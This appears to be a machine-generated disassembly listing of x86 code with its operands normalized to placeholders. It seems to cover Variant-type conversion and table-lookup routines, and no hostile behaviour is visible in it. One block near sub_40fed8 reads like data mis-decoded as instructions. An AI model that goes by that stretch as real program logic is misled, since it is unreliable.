mov eax ebx
call sub_404798
jmp r-xdata
jmp r-xdata
call sub_40e0dc
sub_40ec40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e480
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_40475c
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404848
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ece4
lea eax [ ebp - 0x10 ]
call sub_40e7a0
retn
sub_40ed0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eac8
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40edf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed69
lea eax [ ebp - 0x10 ]
call sub_40e7a0
retn
sub_40ed70
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41018c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e7a0
retn
sub_40edf4
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40ee2d ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fc0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f6c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403fc0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40914c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fc0
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40914c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403fc0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb0c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eb44
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_40475c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404848
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40eb7c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407e00
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403fc0
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407e00
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40edf4
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ec40
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403fc0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f332
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f90
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404664
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f90
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404664
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ed0c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403fc0
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403fc0
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e040
test ah 0x40
je r-xdata
mov eax esi
call sub_403f6c
mov edx eax
mov eax ebx
call sub_40ed70
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ec40
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403fc0
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ec40
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403fc0
jmp r-xdata
jmp [ eax * 4 + jump_table_40f0c1 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40914c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40914c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eb0c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041f4
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40eb44
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041f4
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404194
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40eb7c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041f4
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403fc0
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407e00
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407e00
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403fc0
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40edf4
jmp r-xdata
sub_40f338
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e480
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40475c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3cc
lea eax [ ebp - 0x10 ]
call sub_40e7a0
retn
sub_40f3f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eac8
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f51c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f44d
lea eax [ ebp - 0x10 ]
call sub_40e7a0
retn
sub_40f454
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41018c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f513
lea eax [ ebp - 0x20 ]
call sub_40464c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40475c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404848
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e7a0
retn
sub_40f51c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f556 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404798
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40464c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404798
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40914c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404798
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40914c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404798
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb0c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404688
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40eb44
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404688
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40475c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404848
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40eb7c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404688
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407d14
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407e00
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404798
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407e00
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f51c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f338
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404688
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fa75
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404664
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404664
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f90
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404664
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f90
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404664
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f90
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f3f0
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404688
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404798
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e040
test ah 0x40
je r-xdata
mov eax esi
call sub_40464c
mov edx eax
mov eax ebx
call sub_40f454
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f338
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404688
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f338
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404688
jmp r-xdata
jmp [ eax * 4 + jump_table_40f7dd ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40914c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40914c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40eb0c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404688
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eb44
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404688
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40475c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40eb7c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404688
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404798
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d14
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407e00
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407e00
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404798
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f51c
jmp r-xdata
sub_40fa7c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e724
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40fab8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e724
sub_40fae4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e724
sub_40fb48
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
mov eax ebx
call sub_40e724
sub_40fb74
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404848
pop esi
pop ebx
retn
mov eax ebx
call sub_40e724
sub_40fd30
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403fc0
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41018c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fc0
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407e28
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404278
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403184
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402854
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4041d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe5d
lea eax [ ebp - 0x208 ]
call sub_403f6c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404278
sub_40fed8
inc [ eax ]
fild [ eax ]
or [ esi + 0x61 ] dl
jb r-xdata
cmp bh bh
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41018c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41010c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40fee8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404d34
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ff50
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403234
sub_40ff98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41010c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41018c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_40ffec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_410024
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41010c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_410060
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4100ca
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410164
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032e8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41018c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d34
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_410244
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404d3c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410304
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
